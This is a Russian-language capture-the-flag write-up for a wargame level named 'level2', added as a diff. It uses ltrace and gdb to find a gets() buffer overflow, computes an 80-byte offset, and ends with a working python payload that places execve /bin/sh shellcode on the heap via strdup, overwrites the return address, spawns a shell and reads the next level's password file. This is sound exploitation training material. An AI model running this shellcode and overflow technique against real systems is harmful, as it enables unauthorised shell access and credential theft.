@@ -1,0 +1,93 @@
+1) Глянем ltrace
+	ltrace ./level2
+	__libc_start_main(0x804853f, 1, 0xbffff7b4, 0x8048550, 0x80485c0 <unfinished ...>
+	fflush(0xb7fd1a20)                             = 0
+	gets(0xbffff6bc, 0, 0, 0xb7e5ec73, 0x80482b5
+	)  = 0xbffff6bc
+	puts(""
+	)                                       = 1
+	strdup("")                                     = 0x0804a008
+	+++ exited (status 8) +++
+2) gdb ./level2
+	i func
+	...
+	0x080484d4  p
+	0x0804853f  main
+	...
+3) Видим две функции p и main. дизассемблируем их
+
+	disas main
+	...
+	0x0804853f <+0>:	push   %ebp
+	0x08048540 <+1>:	mov    %esp,%ebp
+	0x08048542 <+3>:	and    $0xfffffff0,%esp
+	0x08048545 <+6>:	call   0x80484d4 <p>
+	0x0804854a <+11>:	leave
+	0x0804854b <+12>:	ret
+	...
+
+	disas p
+	...
+	0x080484d4 <+0>:	push   %ebp
+	0x080484d5 <+1>:	mov    %esp,%ebp
+	0x080484d7 <+3>:	sub    $0x68,%esp
+	0x080484da <+6>:	mov    0x8049860,%eax
+	0x080484df <+11>:	mov    %eax,(%esp)
+	0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
+	0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
+	0x080484ea <+22>:	mov    %eax,(%esp)
+	0x080484ed <+25>:	call   0x80483c0 <gets@plt>
+	0x080484f2 <+30>:	mov    0x4(%ebp),%eax					#адрес возврата
+	0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
+	0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
+	0x080484fb <+39>:	and    $0xb0000000,%eax
+	0x08048500 <+44>:	cmp    $0xb0000000,%eax					#проверка, чтобы убедиться, что мы не перезаписываем адрес возврата на адрес в стеке
+	0x08048505 <+49>:	jne    0x8048527 <p+83>					#если не стек - прыжок на 0x8048527
+	0x08048507 <+51>:	mov    $0x8048620,%eax
+	0x0804850c <+56>:	mov    -0xc(%ebp),%edx
+	0x0804850f <+59>:	mov    %edx,0x4(%esp)
+	0x08048513 <+63>:	mov    %eax,(%esp)
+	0x08048516 <+66>:	call   0x80483a0 <printf@plt>			#если стек
+	0x0804851b <+71>:	movl   $0x1,(%esp)
+	0x08048522 <+78>:	call   0x80483d0 <_exit@plt>			#выход
+	0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
+	0x0804852a <+86>:	mov    %eax,(%esp)
+	0x0804852d <+89>:	call   0x80483f0 <puts@plt>				#вывод в консоль
+	0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
+	0x08048535 <+97>:	mov    %eax,(%esp)
+	0x08048538 <+100>:	call   0x80483e0 <strdup@plt>			# в куче
+	0x0804853d <+105>:	leave
+	0x0804853e <+106>:	ret
+	...
+
+4) Мы можем разместить в куче sh через вызов strdup
+	Получаем адрес переменной, попадающей в strdup:
+	(gdb) b *0x08048538
+	Breakpoint 1 at 0x8048538
+	(gdb) r
+	Starting program: /home/user/level2/level2
+	test
+	test
+
+	Breakpoint 1, 0x08048538 in p ()
+	(gdb) p/x $eax
+	$1 = 0xbffff6ac
+
+	i reg
+	...
+	ebp            0xbffff6f8	0xbffff6f8
+	...
+
+	Получим адрес возврата из регистра ebp + 4:
+	p/x 0xbffff6f8 + 4
+	$2 = 0xbffff6fc
+
+	Получим смещение длиной в 80:
+	p 0xbffff6fc - 0xbffff6ac
+5) shellcode для запуска sh нашли на сайте http://shell-storm.org/shellcode/files/shellcode-811.php
+	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
+	80(смещение) - 28(sh код) = 52 символа надо добить
+6) подаем в gets() python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A"*52 + "\x08\xa0\x04\x08"' > /tmp/lvl2
+	cat /tmp/lvl2 - | ./level2
+	cat /home/user/level3/.pass
+	получили токен
